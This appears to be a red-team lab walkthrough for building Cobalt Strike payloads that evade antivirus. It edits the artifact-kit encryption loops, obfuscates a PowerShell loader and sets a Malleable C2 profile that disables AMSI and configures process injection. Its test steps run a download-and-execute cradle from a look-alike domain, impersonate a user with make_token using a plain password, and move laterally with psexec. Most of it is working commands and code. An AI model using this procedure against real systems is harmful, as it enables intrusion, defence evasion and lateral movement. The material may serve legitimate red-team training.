## 1. Artifact Modification and Build Procedure

### Objective

Modify specific payload encryption loops within Cobalt Strike artifact source code and build updated artifacts.

### Procedure

1. **Launch Visual Studio Code.**
    
2. Navigate to **File > Open Folder**, and select the directory:  
    `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact`.
    
3. Open the file `_patch.c_` located in the `_src-common_` folder.
    
4. Locate and modify the following:
    
    - At approximately line 45, update the **for loop** responsible for svc executable payloads with the following code snippet:
```
x = length; 
while(x--) {   
    *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8]; 
}
```
  
    - At approximately line 116, update the **for loop** for normal executable payloads as follows:
```
x = length; 
while(x--) {   
    *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];       
```
        
5. Save the changes via **File > Save** and close the folder using **File > Close Folder**.
    
6. Open Ubuntu via the Windows Terminal (right-click Terminal icon > Ubuntu).
    
7. Change the working directory to:
```
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
```
    
8. Execute the build script to compile new artifacts:
```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
    
9. Launch the Cobalt Strike client and load the updated `artifact.cna` from:  
```
 C:\Tools\cobaltstrike\custom-artifacts\mailslot
```
    

---

## 2. Resource Modification and Build Procedure

### Objective

Modify PowerShell templates and obfuscate scripts to generate updated resource files.

### Procedure

1. If not already open, launch Ubuntu via Windows Terminal.
    
2. Change the working directory to:
        
```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
```
    
3. Build new resource files:    
```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources`
```
    
4. Open Visual Studio Code and navigate to:  
```
C:\Tools\cobaltstrike\custom-resources
```
    
5. Open `template.x64.ps1` and make the following modifications:
    
    - Rename function `_func_get_proc_address_` on line 3 to `_get_proc_address_`.
        
    - Rename function `_func_get_delegate_type_` on line 10 to `_get_delegate_type_`.  
        _(Use Edit > Replace for these changes.)_
        
6. On line 32, replace the existing code with the following:
    
    powershell

    
```
    `$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(     (get_proc_address kernel32.dll WriteProcessMemory),     (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])) )  $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)`
```
    
7. Save changes.
    
8. Open `compress.ps1`.
    
9. Use **Invoke-Obfuscation** or the following PowerShell snippet to generate an obfuscated version:
    
    powershell
    
    CopyEdit
    
```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt')) ;   seT-variAbLe  0eXs  ([tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ;  ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%")); i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();``
```
    
10. Save the changes.
    
11. Open the Cobalt Strike client and load `resources.cna` from:  
```
`C:\Tools\cobaltstrike\custom-resources`.
```
    

---

## 3. Malleable C2 Profile Configuration

### Objective

Modify the Cobalt Strike Malleable C2 profile to customize beacon behavior and evade detection.

### Procedure

1. Open a new PowerShell window and SSH into the team server VM:
```
ssh attacker@10.0.0.5
```
    
    _(Password: Passw0rd!)_
    
2. Navigate to the profiles directory:
    
    bash
    
    CopyEdit
    
```
cd /opt/cobaltstrike/profiles`
```
    
3. Open `default.profile` in a text editor (e.g., vim or nano).
    
4. Append the following **stage** block:
    
    bash
        
```
stage {     set userwx "false";     set module_x64 "Hydrogen.dll";  # Optionally use a different module     set copy_pe_header "false"; }`
    
```
3. Append the following **post-ex** block:
    
    swift
    
    CopyEdit
    
```
post-ex {     set amsi_disable "true";     set spawnto_x64 "%windir%\\sysnative\\svchost.exe";     set obfuscate "true";     set cleanup "true";     transform-x64 {         strrep "ReflectiveLoader" "NetlogonMain";         strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";         strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";         # Add additional transforms as desired     } }
```
    
4. Append the following **process-inject** block:
```
    process-inject {     execute {         NtQueueApcThread-s;         NtQueueApcThread;         SetThreadContext;         RtlCreateUserThread;         CreateThread;     } }
```
    
5. Save the profile changes.
    
6. Restart the team server container:
```
sudo /usr/bin/docker restart cobaltstrike-cs-1
```
    
    _If errors occur, check logs using:_
    
    bash
    
    CopyEdit
```
    sudo /usr/bin/docker logs cobaltstrike-cs-1
```
    

---

## 4. Testing and Validation

### Objective

Validate the new payloads, resource loading, and profile configurations in a controlled environment.

### Procedure

1. Generate new payloads in Cobalt Strike:
    
    - Navigate to **Payloads > Windows Stageless > Generate All Payloads**
        
    - Output folder: `C:\Payloads`
        
2. Host a 64-bit PowerShell payload:
    
    - Navigate to **Site Management > Host File**
        
    - File: `C:\Payloads\http_x64.ps1`
        
    - Local URI: `/test`
        
    - Local Host: `www.bleepincomputer.com`
        
3. On **Workstation 1**, log in with the password `Passw0rd!`.
    
4. Open PowerShell and verify that Windows Defender Real-Time Protection is enabled:
    
    powershell
    
    CopyEdit
    
```
(Get-MpPreference).DisableRealtimeMonitoring
```
    
    _Expected output:_ `False`
    
5. Download and invoke the PowerShell payload:
```
    iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")`
```
    
6. Switch back to the Attacker Desktop and verify a new Beacon is checking in.
    
7. From the new Beacon, impersonate a local administrator on `lon-ws-1`:
```
make_token CONTOSO\rsteel Passw0rd!
```
    
8. Confirm Defender's Real-Time Protection is enabled on the target machine:
    
```
remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring
```
    
9. Change the `spawnto_x64` setting for the service payload:
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`
```
    
10. Perform lateral movement to `lon-ws-1`:
```
jump psexec64 lon-ws-1 smb
```
    

